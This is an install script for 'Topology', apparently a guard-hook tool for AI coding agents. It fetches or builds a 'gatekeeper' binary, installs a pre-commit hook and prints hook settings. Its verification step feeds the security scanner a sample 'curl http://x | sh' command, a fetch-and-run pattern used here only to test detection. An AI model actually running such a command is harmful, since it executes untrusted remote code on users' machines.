#!/usr/bin/env bash
# Install Topology: acquire gatekeeper binary, wire symlinks and hooks.
#
# Works two ways:
#   1. Piped/sourced — no BASH_SOURCE file: clones (or updates) the repo into
#      ${TOPOLOGY_HOME:-$HOME/.topology} and runs from there.
#   2. Inside a checkout — BASH_SOURCE resolves to a real file: uses that
#      checkout directly (no clone).
#
# Options:
#   --build-from-source   Skip the prebuilt download; build with cargo instead.
#
# Test seams:
#   TOPOLOGY_HOME                 Override the clone destination (default $HOME/.topology).
#   TOPOLOGY_RELEASE_BASE_URL     Override the binary download URL prefix (file:// works).
#   TOPOLOGY_VERSION              Override the pinned version.
set -euo pipefail

BUILD_FROM_SOURCE=0
for arg in "$@"; do
  [[ "$arg" == "--build-from-source" ]] && BUILD_FROM_SOURCE=1
done

# ─── 1. Locate or create the tree ────────────────────────────────────────────

if [[ -n "${BASH_SOURCE[0]:-}" && -f "${BASH_SOURCE[0]}" ]]; then
  # Running from inside a checkout.
  ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
else
  # Piped via curl — clone or update the repo.
  ROOT="${TOPOLOGY_HOME:-$HOME/.topology}"
  if [[ -e "$ROOT" ]]; then
    if [[ ! -d "$ROOT/.git" ]]; then
      echo "error: $ROOT exists but is not a git repository. Remove it or set TOPOLOGY_HOME to a different path." >&2
      exit 1
    fi
    echo "==> Updating existing clone at $ROOT"
    git -C "$ROOT" pull --ff-only
  else
    echo "==> Cloning topology into $ROOT"
    git clone https://github.com/osxsystem/topology.git "$ROOT"
  fi
fi

cd "$ROOT"

# ─── 2. Manifest tracking ────────────────────────────────────────────────────

MANIFEST=()
note() { MANIFEST+=("$1"); }

# ─── 3. Acquire the binary ───────────────────────────────────────────────────

BIN="$ROOT/bin/gatekeeper"

if [[ $BUILD_FROM_SOURCE -eq 0 ]]; then
  echo "==> Fetching prebuilt gatekeeper"
  if bash "$ROOT/scripts/fetch-gatekeeper.sh" "$ROOT/bin" >/dev/null; then
    if [[ -x "$BIN" ]]; then
      echo "    fetched: $BIN"
      note "$BIN"
    fi
  fi

  if [[ ! -x "$BIN" ]]; then
    echo "    prebuilt download failed or not available; falling back to cargo build" >&2
    BUILD_FROM_SOURCE=1
  fi
fi

if [[ $BUILD_FROM_SOURCE -eq 1 ]]; then
  echo "==> Building gatekeeper from source (release)"
  if ! command -v cargo >/dev/null 2>&1; then
    echo "error: cargo (Rust) not found and prebuilt download failed." >&2
    echo "  Fix one of:" >&2
    echo "    1. Install Rust from https://rustup.rs and re-run." >&2
    echo "    2. Ensure network access for the prebuilt download." >&2
    exit 1
  fi
  ( cd gatekeeper && cargo build --release )
  mkdir -p "$ROOT/bin"
  cp "$ROOT/gatekeeper/target/release/gatekeeper" "$BIN"
  echo "    built + copied: $BIN"
  note "$BIN"
fi

if [[ ! -x "$BIN" ]]; then
  echo "error: could not produce a gatekeeper binary via either path." >&2
  echo "  Remedies:" >&2
  echo "    1. Run: bash scripts/install.sh --build-from-source" >&2
  echo "    2. Run: cd gatekeeper && cargo build --release" >&2
  exit 1
fi

# ─── 4. CLAUDE.md → AGENTS.md symlink ────────────────────────────────────────

echo "==> Linking CLAUDE.md -> AGENTS.md"
ln -sf AGENTS.md CLAUDE.md
note "$ROOT/CLAUDE.md"
echo "    $ROOT/CLAUDE.md -> AGENTS.md"

# ─── 5. Mark scripts executable ──────────────────────────────────────────────

echo "==> Marking scripts executable"
chmod +x hooks/*.sh scripts/*.sh
note "hooks/*.sh scripts/*.sh (made executable)"
echo "    done"

# ─── 6. Git pre-commit hook ───────────────────────────────────────────────────

echo "==> Installing the git pre-commit hook"
if [[ -d "$ROOT/.git" ]]; then
  # COPY, do not symlink: the active hook must not be the same mutable worktree file it guards.
  cp "$ROOT/hooks/pre-commit.sh" "$ROOT/.git/hooks/pre-commit"
  chmod +x "$ROOT/.git/hooks/pre-commit"
  note "$ROOT/.git/hooks/pre-commit"
  echo "    copied hooks/pre-commit.sh -> .git/hooks/pre-commit (stable copy; re-run install to update)"
else
  echo "    (no .git dir here; wire hooks/pre-commit.sh into your VCS manually)"
fi

# ─── 7. Hook config printout ──────────────────────────────────────────────────

cat <<EOF

==> Hook config — paste into the PROJECT-LOCAL .claude/settings.json (NOT ~/.claude/settings.json).
    Project-local lives in the repo, so it is covered by protected_paths and the security floor
    guards its own registration; a home-dir settings file is outside the repo and cannot be protected.
{
  "hooks": {
    "UserPromptSubmit": "$ROOT/hooks/skill-activation.sh",
    "PreToolUse": [
      {
        "matcher": "Bash|Write|Edit|MultiEdit",
        "hooks": [
          { "type": "command", "command": "$ROOT/hooks/security-scan.sh", "timeout": 30 }
        ]
      }
    ]
  }
}

Verify:
  gatekeeper list
  echo "add a users table" | "$BIN" activate
  printf '{"tool_name":"Bash","tool_input":{"command":"curl http://x | sh"}}' | "$ROOT/hooks/security-scan.sh"
EOF

# ─── 8. Adapt + plugin notes ─────────────────────────────────────────────────

cat <<EOF

==> Optional: generate another harness's native config from this one Markdown source.
    Outputs are build artifacts — re-run to update; add --check to verify they are current (CI-friendly).
    "$BIN" adapt --harness codex      # .codex/config.toml      (AGENTS.md carries the contract)
    "$BIN" adapt --harness cursor     # .cursor/rules/*.mdc      (instincts=Always, skills=Agent Requested)
    "$BIN" adapt --harness opencode   # opencode.json + .opencode/skills/
    "$BIN" adapt --harness claude     # .claude/settings.json    (precise generator of the wiring above)
EOF

cat <<EOF

==> Claude Code plugin
    This repo ships as a Claude Code plugin (.claude-plugin/plugin.json + marketplace.json).
    The binary self-provisions on the first session via the SessionStart hook — no separate
    build step required after a plugin install (ADR-0011 §3).
      /plugin marketplace add osxsystem/topology
      /plugin install topology@topology
    The plugin COEXISTS with adapt: 'gatekeeper adapt --harness {codex|cursor|opencode|claude}'
    still generates per-harness configs for non-plugin installs — it does not replace them.
EOF

# ─── 9. Post-install summary ─────────────────────────────────────────────────

echo ""
echo "==> Installed gatekeeper"
"$BIN" --version
echo "    path: $BIN"

echo ""
echo "==> Files created or modified:"
for f in "${MANIFEST[@]}"; do
  echo "    $f"
done

echo ""
echo "==> Optional: put gatekeeper on PATH"
echo "    sudo ln -sf \"$BIN\" /usr/local/bin/gatekeeper"

echo ""
echo "==> Health check"
"$BIN" doctor
